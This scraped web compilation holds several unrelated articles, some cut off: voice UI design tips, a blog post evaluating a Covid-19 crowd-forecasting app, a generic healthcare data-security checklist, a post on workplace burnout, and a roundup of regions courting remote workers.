example.</p><p>There’s no need to replace your current user interface with a voice user interface. Rather you should evaluate which tasks in your application are the most tedious and easiest to do by using voice and add voice as a modality to those features.</p><div><div><div><p>Sign up to our Voice Design Crash Course and learn the best practices for creating great voice user interfaces.</p></div></div></div><h2>Receiving commands from the user</h2><h3>5. Onboard the user</h3><p>When your users first see your voice UI, they will need some guidance on how to use it.</p><p>These examples should be placed close to where the visual feedback will appear. You can hide the examples after the user has tried the voice user interface.</p><h3>6. Avoid using a wake word</h3><p>While voice assistants use a wake word so that they can be activated from a distance, your touch screen application doesn’t need to. Repeating the wake word every time makes the experience jarring, adds latency and decreases the reliability.</p><p>The hands free scenario is far less relevant than you might initially think, as the user is already holding the device. There are also privacy risks involved with a wake word.</p><h3>7. Prefer push-to-talk button mechanism</h3><p>Push-to-talk is the best way to operate a microphone in a multimodal touch screen application. When the user is required to press a button while talking, it’s completely clear when the application is listening. This also decreases latency by making endpointing very explicit, eliminating the possibility of endpoint false positives (system stops listening prematurely) and false negatives (systems does not finalize request after user has finished the command).</p><p>On the desktop you can use the spacebar for activating the microphone.</p><p>You can also add a slide as an optional gesture to lock the microphone for a longer period of time. WhatsApp has a good implementation of the design in their app.</p><h3>8. Signal clearly when the microphone button is pushed down.</h3><p>To make it sure the user knows that the application is listening, signal clearly when the microphone button is pushed down. This is especially important if using the push-to-talk pattern.</p><p>You can use sound, animation, tactile feedback (vibration) or a combination to signal the activation. On a handheld touch screen device, make sure that the activated microphone icon is visible from behind the thumb when push-to-talk is activated.</p><h2>Giving feedback to the user</h2><h3>9. Use non-interruptive modalities for feedback</h3><p>Non-interruptive modalities include haptic, non-linguistic auditory, and perhaps most importantly visual feedback. Using these modalities, the application can react fast and without interruption to the user. For instance, in the case of “I’m interested in t-shirts,” the UI would swiftly show the most popular t-shirt products, instantly enabling the user to continue with a refining utterance, ”do you have Boss.” This narrows further down the displayed products to show only the Boss branded t-shirts.</p><p>On the other hand, voice synthesis is a bad idea for feedback, as any ongoing user utterance will be abruptly interrupted. Voice is also a pretty slow channel for transmitting information and for returning users, hearing the same speech synthesises every time gets annoying very fast.</p><h3>10. Minimize latency with streaming natural language understanding</h3><p>One important part of user experience is the perceived responsiveness of the application. Designers are using tricks such as lazy loading, doing tasks on background, visual illusions and preloading of content to make their applications seem faster and this should be done with voice, too.</p><p>In voice applications, immediate UI reaction is even more important. Immediate UI reaction encourages the user to use longer expression and to continue the voice experience. In case of an error, it enables the user to recover fast.</p><h3>11. Steer user’s gaze and visual attention</h3><p>When using voice effectively the user can control the UI an order of magnitude faster compared to tapping and clicking. This means that a lot of stuff might be happening in the UI. It is important that the user can keep up with these UI reactions.</p><p>Typically UI reactions manifest themselves in some sort of visual queues, micro animations and transitions. There is an instinctive inclination in the human visual cognition system to move visual focus to where movement is happening.</p><p>Therefore it is an antipattern to scatter visual ui reactions all over the visual field of the user, e.g. streaming transcription animation on top of the screen and other ui reactions at the bottom of the screen. This will result in the user's gaze bouncing back and forth on the screen making it very hard to understand what is happening in the user interface and inflicting unnecessary cognitive load and annoyance to the user.</p><p>For this reason it is important to either centralize all visual UI reactions near one focal point,meaning that both the transcript as well as the visual transitions resulting from the user commands are shown very close to each other. The other option is to steer the users gaze linearly on the screen with a cascade of animations happening e.g. top down, left to right.</p><h3>12. Minimize visual unrest in triggered events.</h3><p>While a voice user interface needs to be as close to real-time as possible, minimize flicker and visual unrest. You can use placeholder images and elements to make sure the application looks smooth and reacts fast. Recovering from misinterpretation</p><h3>13. Show the text transcript</h3><p>Text transcription of users’ voice input is the most important part of the feedback in case of an error. Lack of action tells the user their input was not correctly understood, but in case of an error in the speech recognition, the transcript can enable them to understand why that happened.</p><p>Transcript can also be valuable for the user when everything goes right. It tells the user they are being understood and encourages them to continue.</p><p>The transcript should appear always in the same, center place in the users’ field of vision. If you are using Speechly, you can use the …</p></div></div></div></div>

<p>Some time ago I started working on a <a href="https://cmmid-lshtm.shinyapps.io/crowd-forecast/">crowd-forecasting app</a> for my PhD (<a href="https://github.com/epiforecasts/covid-german-forecasts/">code</a>). The app allows experts and non-experts to make predictions for the future trajectory of Covid-19. We use this app to submit case and death forecasts for Germany and Poland to the <a href="https://github.com/KITmetricslab/covid19-forecast-hub-de">German and Polish Forecast Hub</a> (as part of a <a href="https://osf.io/zkdvb/">pre-registered research project</a> on short-term forecasting). So far this has proved to be surprisingly successful. According to our own evaluation, a crowd of around six people (<strong>edit</strong>: to clarify this, we were so far only six people in total) currently outperforms all other models and ensembles submitted to the Forecast Hub.  Overall, we want to achieve the following goals with the projected: </p>



<ul><li>generate forecasts for the German and Polish Forecast hub</li><li>Answer a variety of interesting research questions: <ul><li>do experts perform better than non-experts?</li><li>how does the baseline model shown affect predictions?</li><li>are some forecasters consistently better than others?</li><li>do forecasters learn and improve over time?</li></ul></li><li>build generalizable tools for other tasks and future pandemics</li></ul>



<p>Let’s have a look at the app, it’s predictions and how it compares against the other models in the Forecast Hub. But before we start: You can sign up and join the crowd-forecasting effort. Simply <a href="https://cmmid-lshtm.shinyapps.io/crowd-forecast/">visit the app</a>, choose a username and password and start predicting.  You can also track your performance through our <a href="http://epiforecasts.io/covid-german-forecasts/">performance and evaluation board</a>. We are happy about any contributions and especially your feedback!</p>



<h5>How the app works</h5>



<p>The app is a simply web app created with <a href="https://www.r-project.org/">R</a> <a href="https://shiny.rstudio.com/">shiny</a>. While some of the details aren’t trivial, something like this is not too hard to set up (<a href="https://followtheargument.org/kontakt">contact me</a> if you would like to do something similar). </p>



<p>This is what the app looks like: </p>

<p>The following paragraphs explain how to make forecasts and what to pay attention to. Feel free to skip ahead if you’re more interested in the evaluation. </p>



<p>There is a large panel that visualizes your predictions. You can twist that a bit by selecting different prediction intervals (e.g. 50%, 90%, 98%) or show everything on a log scale. The panel on the right is used to make predictions. You can choose a distribution (really you should probably just stay with the default, ‘log-normal’), and specify the median and width of your forecast. You can either specify values by hand or you can drag and drop the points in the plot. </p>



<p>The median is the value for which you would say “I would think it’s 50:50 whether the actual value will be higher or lower”. If that is not intuitive, you can probably cheat a bit and just take the median as the value you find most likely (<a href="https://en.wikipedia.org/wiki/Mode_(statistics)#/media/File:Visualisation_mode_median_mean.svg">although that is not precisely correct, since the most likely value would be the mode</a>). The width parameter changes your uncertainty. Let’s say you selected to show the 50% and 90% prediction intervals (this is the default). Then the light green ribbon shows you the range in which the actual observation should fall with 90% probability. The dark green ribbon shows you were 50% of the true observations should fall inside. If you believe that the number of weekly cases will be between 120.000 and 150.000 with 90% probability, then you should adapt the width of the distribution until this is true. </p>



<p>Usually, new forecasters tend to be too certain. It is ok to have wide prediction intervals and often better to err on the side of caution. Also, your uncertainty should increase over time as you are less sure about the far future than the next week. The width parameter should therefore be increasing from week to week. To help you with forecasting, additional information like daily case counts is shown if you select the appropriate tab in the large panel. </p>



<p>The app is open all the time, but the prediction target is weekly cases and deaths. The weekly data is updated every Saturday (at around 16.00 UTC). While you can of course make predictions before that, you will the last data point. Forecasts are collected every Tuesday at around 13.00 UTC, aggregated, and submitted to the Forecast Hub. </p>



<h5>Forecast aggregation</h5>



<p>The submission format that the Forecast Hub expects is based on a set of 23 quantiles. This means that the predictive distribution needs to be specified using 23 numeric values that mark different points of the distribution. We are asked to provide the values for which we believe that there is a 1%, 2.5%, 5%, …. 50%, …., 95%, 97.5%, 99% probability that the true observed case or death number will be below that value. To that end we compute this values from the predictive distributions of all forecasters and combine them. Currently we simply take the arithmetic mean, because it uses the most information. But one of the points on our agenda is to look whether a trimmed mean (the x% most extreme predictions are disregarded and the rest is averaged) or a median is better. </p>



<p>Here are last week’s (2020-11-23) predictions for cases in Germany as well as the ensembled prediction (all the plots in the post were automatically generated using the <a href="https://github.com/epiforecasts/scoringutils">scoringutils package</a> in R): </p>

<div><figure><img loading="lazy" src="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png" alt="" width="300" height="205" srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png 539w, https://followtheargument.org/wp-content/uploads/2020/11/image-2-300x205.png 300w" sizes="(max-width: 300px) 100vw, 300px" data-old-src="//followtheargument.org/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png" data-srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-2.png 539w, https://followtheargument.org/wp-content/uploads/2020/11/image-2-300x205.png 300w"><figcaption>Mean ensemble of forecasts for 2020-11-23 (EpiNow2 is a separate model not included in the ensemble)</figcaption></figure></div>



<p>We can see that not all forecasters have uncertainty that increases with the forecast horizon. This will hopefully change in the future as we only started providing feedback on the forecasts two days ago. But, maybe apart from the very large uncertainty in the first week, the ensemble forecast looks quite reasonable. </p>



<h5>Comparing forecasts over time</h5>



<p>Let’s look at some of the forecasts we made for the Forecast Hub over time. The true values are always shown in black. All data points to the left of the forecast ribbons are the data that were known at the time the forecast was made. EpiNow2 is a computer model that we evaluated along with our own forecasts. </p>

<p>It is interesting to see that we (apart from the forecaster seb) completely missed the exponential nature of the trend in October. We missed it on 2020-10-12 and <em>again</em> on 2020-10-19. We missed it just like everybody had missed it in February and March and have learned little from it.</p>

<p>On 2020-10-26 we finally picked up the exponential growth, but at that time it was already starting to slow down.</p>

<p>On 2020-11-02, seb was again the only one who predicted a changing trend – albeit too optimistically.</p>

<p>On 2020-11-09, the rest of us had mostly caught up. We maybe could have done better, but compared to the other models submitted to the Forecast Hub, we were still doing relatively well. On 2020-11-09, our aggregated forecast (called EpiExpert in the top left) was the only one what that predicted a changing trend. The other models mostly were still in exponential growth mode: </p>



<figure><img loading="lazy" width="1024" height="598" src="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png" alt="" srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-300x175.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-768x449.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-21.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="//followtheargument.org/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png" data-srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-300x175.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-768x449.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-21.png 1366w"></figure>



<p>The only exceptions were the LANL-GrowthRate model (which still had exponential uncertainty) and the KIT-baseline model (which always predicts constant case numbers).</p>



<h5>Assessing forecasts formally</h5>



<p>Instead of only looking at the forecasts, we can assess forecasting performance more formally by using the weighted interval score. The interval score assesses predictions by measuring </p>



<p><em>score = underprediction + overprediction + sharpness</em>.</p>



<p>Underprediction and overprediction are penalties that you get if the true observed value falls outside of your prediction interval. Sharpness means the width of your forecasts. You therefore get penalised if you are either wrong or to cautious and uncertain in your prediction. Smaller scores are better. The score is then weighted according to the prediction interval. This happens such that inner predictions (e.g. the median) matter more than the outer predictions (e.g. your 98% prediction interval).</p>



<p>Other metrics commonly used are the absolute error of the median (the absolute difference between your median forecast and the observed value) and coverage. Coverage refers to the percentage of values covered by a given central prediction interval. You would ideally want 50% of true observations to fall in your 50% prediction intervals, 90% in the 90% prediction intervals etc. </p>



<p>Let’s look at how we did in terms of the interval score. This plot shows the rank each forecaster achieved in terms of the weighted interval score on a given forecast date: </p>



<figure><img loading="lazy" width="1024" height="851" src="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png" alt="" srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-300x249.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-768x638.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-22.png 1309w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="//followtheargument.org/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png" data-srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-300x249.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-768x638.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-22.png 1309w"></figure>



<p>Indeed, seb dominates the board on 4 of 6 forecast dates. It is important to note that different forecast dates also imply different forecast horizons that are scored. The latest forecasts are only scored on a one-week-ahead forecast, as data for further forecast horizons is not yet known. Generally speaking, larger horizons carry a larger weight when determining the overall score achieved by a model. This is due to the fact that the interval score uses absolute values and scales with the overall error. Simply speaking: if you predict 1000, but the truth indeed 1200, you will get a higher score than if you predict 100 and the true value is 200. Predictions further ahead into the future are more difficult and therefore usually get penalized more heavily. </p>



<p>Let’s look at an overview of different metrics. The first column shows the weighted interval score. The next three columns are the components of the weighted interval score as explained above. Coverage deviation is a measure of whether our 20%, 50% 80% … prediction intervals actually cover 20%, 50%, 80% … of the true values. If the value is negative, this means that forecasts are either biased or overly confident. The second last column shows a measure of bias (i.e. is there a tendency to over- or underpredict) and the last shows the absolute error of the median prediction. </p>

<p>This plot illustrates the point made above about scoring different forecast horizons: The three forecasters who seem to perform best here were ones that only joined two weeks ago. There are no four-week-ahead forecasts to be scored for these forecasters and they therefore have an advantage in …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/healthcare"><p>Healthcare</p></a><h2>5 Features a Healthcare Product Must Have to Protect Its Users’ Data</h2><p>Go through this checklist of five must-have features to make sure your healthcare product protects user data. Bonus: A HIPAA compliance cheat sheet.
</p></div></div><article><div target="_blank"><p>Data security is still far from perfect. But in the end, it is always better to put as much effort into how you protect your information as possible. The more care you take, the lower the chance of a data breach.</p><p>If you don’t know where to start, here are the top five features a secure healthcare product must have. But don’t hurry to skip a section if you’re familiar with the features described in it: while they may be well-known or even obvious, many companies still neglect them or implement them incorrectly.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cf0c17662f0cf3368db5_5d82087f83f4bd6afd25afa7_Book%20banner.png" loading="lazy" alt=""></p></figure><h2>1. 360-Degree Encryption</h2><p>There are two types of encryption:&nbsp;<br></p><ul role="list"><li><strong>Symmetric</strong>,<strong> </strong>when one key is used for both encryption and decryption</li><li><strong>Asymmetric</strong>,<strong> </strong>when there are separate private and public keys&nbsp;<br></li></ul><p>Asymmetric encryption requires more time to implement than symmetric, but it’s usually considered more secure due to the use of two different keys.<br></p><p>If you’re using a symmetric algorithm, go for <strong>AES</strong>. It’s so reliable even the US government had adopted it. The following AES key sizes are available: 128, 192, and 256 bits (the more the better).<br></p><p>If you go with an asymmetric algorithm, we recommend <strong>RSA</strong>. An RSA key is usually 1024 or 2048 bits long, and RSA is widely used to ensure secure communication via insecure networks.&nbsp;<br></p><p>User data can be contained in emails sent by your employees and stored on their laptops, in EHR and EMR systems, on wireless medical devices, on servers, etc. All of these emails, devices, and systems should be equipped with additional encryption in order to keep the data secure.<br></p><p>Note: USB flash drives are not on this list. We highly recommend that you <strong>not</strong> keep user data on them. Flash drives can be encrypted, but they can also easily get lost or stolen, which may lead to a data breach and loss of reputation for your healthcare product.&nbsp;</p><h2>2. Multi-Factor Authentication</h2><p>Even the longest and most complicated passwords can be stolen or brute-forced, leading to identity theft and data loss. Multi-factor authentication is a way to avoid these problems, as it significantly increases the level of security. It should be implemented both for users and employees. &nbsp;</p><p>Here are several methods that may complement password authentication:</p><p>Since healthcare data is one of the most sensitive kinds of user data, we recommend going for a biometric method at all times. But the final choice depends on the resources you have and is up to you. </p><p>Regardless of the multi-factor authentication method you choose, don’t make MFA optional — otherwise, some accounts will be less secure than others. As for the first step of the authentication process, require users to create long and complicated passwords. Simple and short ones can minimize the benefits of MFA and result in a data breach.</p><h2>3. Security Tests</h2><p>These are the top four security tests you should know about:</p><ul role="list"><li><strong>Penetration testing</strong> — Simulates a hacker attack to detect potential vulnerabilities in your healthcare product</li><li><strong>Vulnerability scanning</strong> — Allows you to find symptoms of vulnerabilities with automated software</li><li><strong>Security scanning</strong> — Identifies system weaknesses</li><li><strong>Risk assessment </strong>— Helps you analyze risks already observed in your product or company</li></ul><p>Penetration testing is one of the most important and popular types of security testing among healthcare organizations. It consists of five steps:</p><ol role="list"><li>Identify the goal of testing (for instance, email security validation).&nbsp;</li><li>With the help of specialized scanning tools, identify the system’s weak spots.&nbsp;</li><li>Simulate various attacks and find vulnerabilities.&nbsp;</li><li>Define if these vulnerabilities can be used to provide hackers with access to users’ data.&nbsp;</li><li>Analyze the results, update your software, and run the test again to see if you’ve reached your goal.<br></li></ol><p>Keep in mind: Sometimes security tests are NOT optional.&nbsp;<br></p><p>For example, according to HIPAA (the Health Insurance Portability and Accountability Act of 1996), you must conduct a risk assessment.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cf0c17662f0cf3368db5_5d82087f83f4bd6afd25afa7_Book%20banner.png" loading="lazy" alt=""></p></figure><p>Make sure to meet all applicable regulations and local laws regarding your healthcare product and to carry out all relevant tests.&nbsp;</p><h2>4. Trained Staff</h2><p>Around <a href="https://healthitsecurity.com/news/employee-healthcare-data-security-awareness-top-industry-threat">80% of IT professionals</a> in the healthcare field claim that staff security awareness is one of their top concerns. Here’s what you can do to address that:<br></p><ol role="list"><li><strong>Check your team’s knowledge and skills&nbsp;</strong></li></ol><p>What does your team already know about security? Are they familiar with all kinds of attacks like phishing, baiting, email hacking, contact spamming, vishing, and pretexting?&nbsp;<br></p><p>Social engineering is not a new thing, but it still works even with the most rational people. Its techniques rely not on intelligence but on emotions (for instance, on a desire to be helpful), and that’s why they’re so effective.&nbsp;<br></p><p>You can check your team’s knowledge via questionnaires or interviews. These questionnaires or interviews (and the training itself) should involve the entire team: developers, testers, administrators, front desk workers, researchers, healthcare providers, etc.&nbsp;<br></p><ol start="2" role="list"><li><strong>&nbsp;Develop a plan and start training&nbsp;</strong></li></ol><p>After you discover what your team already knows and what knowledge they’re missing, you can create a detailed plan for security training. You may want to cover the following topics:</p><ul role="list"><li>Passwords and their complexity</li><li>Multi-factor authentication</li><li>Types of security attacks</li><li>How to prevent an attack</li><li>What to do in case of a data breach</li></ul><p>If you’re running a huge company, consider developing several training plans depending on the level of knowledge of employees and/or splitting each training into a few phases.<br></p><ol start="3" role="list"><li><strong>Train your team regularly</strong></li></ol><p>Training can’t be done only once, at the very least because employees come and go.&nbsp;<br></p><p>For new employees, there should be a separate check and training program to help them reach the level of their colleagues. Also, document your trainings — such data may be useful in developing onboarding materials for newcomers.&nbsp;<br></p><p>New hacking methods are developed on a regular basis, and some of them should be known by your employees. To keep them informed, introduce various types of trainings: discussions, computer-based training, classroom training, and so on.&nbsp;</p><h2>5. Perfect Backups</h2><p>Backups are a must for any product operating with sensitive data, but for the healthcare industry, it’s also crucial to restore data that was lost or damaged as quickly as possible. Perfect backups are backups that are available at short notice and allow for the quickest possible data restoration.<br></p><p>Check that you follow these best practices in regards to your backups:</p><ul role="list"><li><strong>Automate data backups</strong> — At some point, your administrator may forget to make a backup. But this won’t be a problem if they’re done automatically AND regularly.</li><li><strong>Encrypt backups</strong> — To keep data totally secure, backups should also be encrypted.</li><li><strong>Regularly test backups</strong> — This is essential to be sure that backups allow for quick data recovery. We recommend testing backups at least every few months. Regarding the tests themselves, you may want to check these things:<br></li></ul><ol role="list"><li>How long does it take to get to the backup?</li><li>How long does it take to restore the data?</li><li>Is it possible to import a complete backup and restore only a couple of files?&nbsp;</li><li>Is it possible to import a complete backup and restore only a couple of files on a different system?&nbsp;</li><li>Is it possible to restore an entire system image to a different hard drive?<br></li></ol><ul role="list"><li><strong>Keep backups in different locations</strong> — ideally, you should have an on-site backup and a remote (cloud) one.</li></ul><h2>Wrap-up</h2><p>By doing these five things, you can save yourself from most modern attacks.<br></p><p>Yet to secure your product quickly and with minimal effort, you must prepare properly before you start: define your business requirements, allocate resources, ensure the quality of the features and practices you want to implement, and then check if your requirements have been met.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cf0c17662f0cf3368db5_5d82087f83f4bd6afd25afa7_Book%20banner.png" loading="lazy" alt=""></p></figure></div></article><section><div><div><p>LIKE THIS ARTICLE?

He is mentally drained and physically exhausted. Tired of his work, Mark feels cynical about the impact he’s having. He tries to detach from the job to protect against feeling overextended. Through all this, Mark thinks he’s not a good nurse; he feels incompetent and his patient care metrics are dropping. Dissatisfied with his work, Mark wants to leave his job.</h5>
<p>Frontline healthcare workers like Mark are experiencing burnout all around the world. But burnout hurts employees in all industries, during a crisis and without it. Burnout is just the symptom of an unsustainable work situation. To fight this insidious problem and engage workers again, we need to know <a href="http://diagnosefraude.com/docs/35-jaar-burnout-wetenschap-research-onderzoek-1973-2008.pdf">three things about burnout</a>: the causes, the effects, and the solutions.</p>
<p>To solve burnout, we need to know exactly what it is; there are <a href="https://www.academia.edu/30307129/Stress_and_Unemployment_A_Comparative_Review_and_Research_Model_of_Female_and_Male_Managers">three elements of burnout</a>. Described in the visual below, burnout has three parts, typically in this order: exhaustion, cynicism, and feelings of incompetence.</p>
<ol>
<li>Exhaustion is physical, mental, and emotional, leading workers to feel overextended and depleted of all their resources.</li>
<li>Cynicism can show up after exhaustion, pushing employees to distance themselves from work by being disengaged, negative, or withdrawing from the position.</li>
<li>Then feelings of incompetence creep in, making workers evaluate themselves poorly and minimize their accomplishments. Now, let’s see what causes these symptoms.</li>
</ol>
<!--kg-card-end: markdown--><figure><img src="https://blog.orgnostic.com/content/images/2020/10/01_orgnostic_blog_3_elements_of_burnout.png" alt="Chart of three elements of burnout" srcset="https://blog.orgnostic.com/content/images/size/w600/2020/10/01_orgnostic_blog_3_elements_of_burnout.png 600w, https://blog.orgnostic.com/content/images/size/w1000/2020/10/01_orgnostic_blog_3_elements_of_burnout.png 1000w, https://blog.orgnostic.com/content/images/2020/10/01_orgnostic_blog_3_elements_of_burnout.png 1320w" sizes="(min-width: 720px) 720px"><figcaption>Three Elements of Burnout</figcaption></figure><!--kg-card-begin: markdown--><h3 id="whatcausesburnout">What Causes Burnout?</h3>
<p>Burnout has many causes: some impact all three elements of burnout, while others increase exhaustion directly. Overall, burnout comes from a work environment with too many energy-draining demands and not enough resources, like support and control over your life inside and away from work. A high workload, especially for a long time, leads to exhaustion which breeds cynicism and feelings of incompetence.</p>
<p>The remaining causes of burnout fall into two domains: your role at work and the broader workplace experience. In a work role, burnout comes from role conflict, ambiguity in the position, bad person-job fit, and low control over work. Role conflict comes from one person having many incompatible demands on their time. For example, a business analyst reporting to their division head and a project manager might have competing priorities from each boss. In the broader workplace experience, employees with low rewards and recognition, missing fairness and reciprocity, a lack of belonging, and incompatible values have more burnout. If your company has these issues, watch out for burned-out employees in your future.</p>

<p>Burnout is expensive for employees, companies, and the healthcare system. The effects of employees’ exhaustion and cynicism hurt everyone along two dimensions: workplace effects and physical symptoms. In the workplace, burnout is linked to dissatisfaction with your job, less commitment to the organization, more calling in sick, higher turnover, and worse performance. These problems at work can spread to the home, where burned-out workers’ problems spill over into their marriage and their family life.</p>
<p>With schools closing from COVID-19 outbreaks, working parents know all about the spillover from home life to work-from-home life and the physical problems that come with it. Physical symptoms of burnout range from sleep issues to chronic diseases: people experiencing burnout report headaches, sleep problems, cold and flu symptoms, muscle tension, hypertension, and gastrointestinal issues. Fortunately, companies can avoid these symptoms of burnout by addressing the root causes directly.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.orgnostic.com/content/images/2020/10/03_orgnostic_blog_impacts_of_burnout.png" alt="Chart of physical and workplace impacts of burnout" srcset="https://blog.orgnostic.com/content/images/size/w600/2020/10/03_orgnostic_blog_impacts_of_burnout.png 600w, https://blog.orgnostic.com/content/images/size/w1000/2020/10/03_orgnostic_blog_impacts_of_burnout.png 1000w, https://blog.orgnostic.com/content/images/2020/10/03_orgnostic_blog_impacts_of_burnout.png 1320w" sizes="(min-width: 720px) 720px"><figcaption>Physical and Workplace Impacts of Burnout</figcaption></figure><!--kg-card-begin: markdown--><h3 id="howdowepreventburnout">How do we Prevent Burnout?</h3>
<p>Fortunately, research on burnout in the workplace found two ways to prevent a stressful work environment from turning into physical problems and workplace disengagement. In a study of 992 employees over 12 months, researchers tracked <a href="https://www.academia.edu/download/43698288/Early_predictors_of_job_burnout_and_enga20160313-29021-fsjkd6.pdf">burnout and work-life metrics</a> to predict which employees would experience “full burnout” on all three dimensions. Employees who experienced more unfair work situations and who only felt exhaustion but not the other two burnout elements, were likely to tip over into a burnout state one year later.</p>
<p>This means that a fairer and more supportive workplace is less likely to create burnout in employees one year later. Unfairness can look like: unequal sharing of workload and pay, poorly handled evaluations or promotion cycles, or employee disputes where both voices aren’t heard. Employees who see their superiors as <a href="https://www.tandfonline.com/doi/abs/10.1080/10615809808249311">fair and supportive</a> were less susceptible to burnout and more accepting of major changes in the organization. Designing fair practices and processes can save companies lots of money and time in labour costs. High turnover can raise businesses’ recruitment, hiring, and training costs while losing workers’ knowledge and skills that contribute to customer service and internal efficiency.</p>
<p>To avoid this, companies can now identify and target employees at risk of burnout with counselling, time off, training, and fairer practices. This stops employees from feeling worse over time about their workplace, sending them down a negative spiral towards quitting.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="beforeyougo">Before you go…</h3>
<p>Orgnostic allows companies to run automatic micro-surveys to track levels of cynicism, exhaustion, and self-esteem among their employees. By combining these qualitative constructs with quantitative indicators of equity compositions, companies use our platform to find and address specific burnout risks before they balloon into a full-on crisis.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Over the last years and months — accelerated by coronavirus — we’ve seen more and more countries, states, and cities actively trying to attract remote workers to come work and live in their area of the world. In the form of visas, cash, tax breaks, or simply better advertising. It’s cool to see this, and I think we will be seeing a lot more of this going forward. </p>



<div><p>If certain locations achieve to spearhead this movement, the reward for them will be a network effect where these mostly young, ambitious professionals will keep coming back and communities will start to exist — what’s been happening in e.g. Canggu, Bali.</p><p>A couple of examples of what I’ve seen happening on this front. <em>(<a href="https://twitter.com/JoshSchoen">hit me up</a> if you have any more examples I should add)</em></p></div>



<h2>Greece</h2>



<p>“Technology means we can now choose where we live and work,” Alex Patelis, chief economic adviser to Prime Minister Kyriakos Mitsotakis, said in comments to Bloomberg. Greece “can now offer tax incentives as well as the sun,” he said.</p>



<figure></figure>



<h3>The Caribbean</h3>



<p>“Barbados, the Cayman Islands, Aruba, Puerto Rico, and St. Kitts and Nevis are among those wooing home-bound toilers from abroad. This is distinct from pandemic <a href="https://www.bloomberg.com/news/articles/2020-07-10/caribbean-nations-selling-second-passports-are-slashing-prices" target="_blank" rel="noreferrer noopener">promotions</a> by some islands to sell second passports at a discount.”</p>



<figure></figure>



<h2>Tulsa, Oklahoma, USA</h2>



<p>“The first class of hand-picked remote workers moved to Tulsa, Oklahoma, in exchange for $10,000 and a built-in community. The city might just be luring them to stay.”</p>



<figure></figure>



<h2>Canary Islands</h2>



<p>“In a bid to mitigate the economic fallout of the coronavirus pandemic, the regional government is investing €500,000 in a campaign to lure Spanish and international home-workers to the archipelago for long-term stays.”</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">"Apart from the obvious, which is the climate, there is the quality and rhythm of life, our open and hospitable character, distances are short, and we are relatively close to Europe", Canary Islands wants to be home for remote work, and I can only say YES! <a href="https://t.co/gsy4xlwzf0">https://t.co/gsy4xlwzf0</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1326083757863022592?ref_src=twsrc%5Etfw">November 10, 2020</a></blockquote>
</div></figure>



<h2>Vermont, USA</h2>



<p>“Starting in January 2019, Vermont will pay $10,000 over two years to a small number of remote workers who move there — money that will help cover costs for&nbsp;relocation, computer software and hardware, internet access, and membership to co-working spaces. Gov. Phil Scott signed&nbsp;<a href="https://legislature.vermont.gov/assets/Documents/2018/Docs/BILLS/S-0094/S-0094%20As%20Passed%20by%20Both%20House%20and%20Senate%20Unofficial.pdf">the bill into law</a>&nbsp;on Wednesday.”</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>TIL Vermont is paying remote workers $10K to live and work from the state: <a href="https://t.co/d6JE45wS8M">https://t.co/d6JE45wS8M</a> h/t <a href="https://twitter.com/mpdaugherty?ref_src=twsrc%5Etfw">@mpdaugherty</a></p><p>Although the program budget is limited to $250K by 2020 (that’s only 25 people). Sounds like a marketing stunt at those numbers.</p></div>— Ryan Hoover (@rrhoover) <a href="https://twitter.com/rrhoover/status/1064242260022181888?ref_src=twsrc%5Etfw">November 18, 2018</a></blockquote>
</div></figure>



<h2>Iceland</h2>



<p>“A new escape route has emerged for anyone looking to circumvent <a href="https://www.bloomberg.com/coronavirus" target="_blank" rel="noreferrer noopener">second-wave lockdowns</a>. Earlier this month, Iceland quietly rolled out changes to its <a href="https://work.iceland.is/working/iceland-announces-new-visa-changes-for-remotely-working" target="_blank" rel="noreferrer noopener">remote-work visa program</a> for citizens beyond the European Schengen Area. Americans—and any foreign national <a href="https://utl.is/index.php/en/who-does-not-need-a-visa" target="_blank" rel="noreferrer noopener">not required to have a visa</a> to enter Iceland—will be allowed to stay in the Land of Fire and Ice for six uninterrupted months, even while the country’s international borders <a href="https://www.icelandair.com/blog/iceland-is-open-faq/" target="_blank" rel="noreferrer noopener">remain largely shut</a>.</p>



